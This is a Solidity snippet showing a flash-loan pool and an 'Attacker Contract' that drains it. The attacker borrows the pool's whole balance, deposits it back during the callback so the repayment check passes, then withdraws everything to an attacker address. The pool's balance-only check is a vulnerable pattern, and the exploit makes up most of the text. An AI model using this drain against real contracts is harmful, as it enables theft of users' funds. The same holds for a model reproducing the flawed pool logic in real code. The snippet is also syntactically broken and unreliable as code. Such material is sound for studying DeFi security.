interface FlashBorrower {
	/// @notice Flash loan callback
	/// @param amount The amount of tokens received
	/// @param data Forwarded data from the flash loan request
	/// @dev Called after receiving the requested flash loan, should return tokens + any fees before the end of the transaction
	function onFlashLoan(
		uint256 amount,
		uint256 fee,
		bytes calldata data
	) external;
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


    ///// Pool Contract
    function deposit(uint _amount) external {
    /// ...LOGIC... ///
    }

    function withdrawAll() external {
    /// ...LOGIC... ///
    }
    function execute(FlashBorrower receiver, uint256 amount, bytes calldata data) external payable {
        uint256 poolBalance = getPoolBalance();

        if(poolBalance < amount) {
            revert("INSUFFICIENT_FUNDS");
        }

        uint256 fee = getLoanFee(amount);

        emit Flashloan(receiver, amount);

		IERC20(token).transfer(address(receiver), amount);
		receiver.onFlashLoan(amount, fee, data);

		if (poolBalance + fee > IERC20(token).balanceOf(address(this))){
            revert("TOKENS_NOT_RETURNED");
        }
    }

///// Attacker Contract
interface Attack {
    function deposit(uint _amount) external {}

    function withdrawAll() external {}

    function execute(FlashBorrower receiver, uint256 amount, bytes calldata data) external {}
}

address pool = 0x0000000000000000000000000000000000000000;
Attack victim = Attack(pool);
address attackerEOA = 0x1000000000000000000000000000000000000001;

uint256 stealAmount = IERC20(token).balanceOf(pool);

    function start() external{
        victim.execute(address(this), stealAmount, );
    }

    function onFlashLoan(uint256 amount, uint256 fee, bytes calldata data) external {
        victim.deposit(stealAmount);
    }

    function finish() external{
        victim.withdrawAll();
        takeOut();
    }

    function takeOut() internal{
        IERC20(token).transfer(attackerEOA, IERC20(token).balanceOf(address(this)));
    }
